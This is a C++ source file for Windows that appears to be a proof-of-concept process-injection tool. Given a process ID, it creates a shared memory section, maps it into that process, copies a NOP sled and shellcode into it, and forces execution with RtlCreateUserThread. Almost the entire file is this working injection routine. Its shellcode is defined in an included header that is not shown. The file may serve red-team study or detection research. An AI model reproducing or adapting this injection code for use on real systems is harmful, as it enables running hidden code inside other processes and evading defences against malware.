///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//  Copyright © Aviv Shabtay 2020, All rights reserved
//
// THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
// ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO
// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
// PARTICULAR PURPOSE.
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include "Injection.h"

int main(int argc, char** argv) {
	DWORD dwPID = -1;
	HANDLE hTarget;
	HANDLE hTargetThread;
	HANDLE sectionHandle = nullptr;
	PVOID localSectionAddress = nullptr;
	PVOID remoteSectionAddress = nullptr;
	NTSTATUS status;
	SIZE_T size = 4096;
	LARGE_INTEGER sectionSize = { size };
	pNtCreateSection NtCreateSection;
	pNtMapViewOfSection NtMapViewOfSection;
	pRtlCreateUserThread RtlCreateUserThread;

	if (argc < 2) {
		printf("[-] Usage: %s <PID>\n", __FILENAME__);
		return -1;
	}

	dwPID = atoi(argv[1]);

	// Get Native-API functions:
	NtCreateSection = (pNtCreateSection)GetProcAddress(GetModuleHandleA(ntdll), ntCreateSection);
	NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(GetModuleHandleA(ntdll), ntMapViewOfSection);
	RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandleA(ntdll), rtlCreateUserThread);

	// Create a memory section:
	status = NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
		NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	if (!NT_SUCCESS(status)) {
		printf("[-] Could not create section, Error: 0x%x\n", status);
		return -1;
	}

	printf("[+] Create section for current process successfully\n");

	// create a view of the memory section in the local process
	status = NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size,
		2, NULL, PAGE_READWRITE);

	if (!NT_SUCCESS(status)) {
		printf("[-] Could not map the section, Error: 0x%x\n", status);

		if (sectionHandle != nullptr)
			CloseHandle(sectionHandle);
		return -1;
	}

	printf("[+] Mapped the section to virtual memory (Address=0x%p) to current process successfully\n",
		localSectionAddress);

	// create a view of the memory section in the target process
	hTarget = OpenProcess(PROCESS_ALL_ACCESS, false, dwPID);
	if (hTarget == nullptr) {
		printf("[-] Could open handle to PID=%d, LastError: 0x%x\n", dwPID, GetLastError());

		if (sectionHandle != nullptr)
			CloseHandle(sectionHandle);

		// TODO: Unmap section ?
		return -1;
	}

	printf("[+] Open the target process (PID=%d) successfully\n", dwPID);

	// Map the memory section with the target process:
	NtMapViewOfSection(
		sectionHandle,
		hTarget,
		&remoteSectionAddress,
		NULL,
		NULL,
		NULL,
		&size,
		2,
		NULL,
		PAGE_EXECUTE_READ
	);

	if (!NT_SUCCESS(status)) {
		printf("[-] Could not map the section, Error: 0x%x\n", status);

		if (sectionHandle != nullptr)
			CloseHandle(sectionHandle);

		// TODO: Unmap section ?

		if (hTarget != nullptr)
			CloseHandle(hTarget);

		return -1;
	}

	printf("[+] Mapped the section to virtual memory (Address=0x%p) of target process (PID=%d) successfully\n",
		remoteSectionAddress, dwPID);

	// Copy the NOP-Sled to mapped section:
	CopyMemory(localSectionAddress, nopSled, strlen(nopSled));
	printf("[+] Copy NOP-Sled to shared section (Address=0x%p) successfully\n", localSectionAddress);

	// Calculate the new offset for the shellcode:
	PVOID newLocation = (PVOID)((DWORD)localSectionAddress + strlen(nopSled));

	// Copy the shellcode to mapped section:
	CopyMemory(newLocation, shellcode, strlen(shellcode));
	printf("[+] Copy shellcode to shared section (Address=0x%p) successfully\n", newLocation);

	// Force target process to start thread executing the shellcode in the mapped section:
	hTargetThread = NULL;
	RtlCreateUserThread(hTarget, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &hTargetThread, NULL);
	printf("[+] Force target process (PID=%d) to execute shellcode successfully\n", dwPID);

	// Release resources:
	CloseHandle(hTargetThread);
	CloseHandle(hTarget);
	CloseHandle(sectionHandle);
}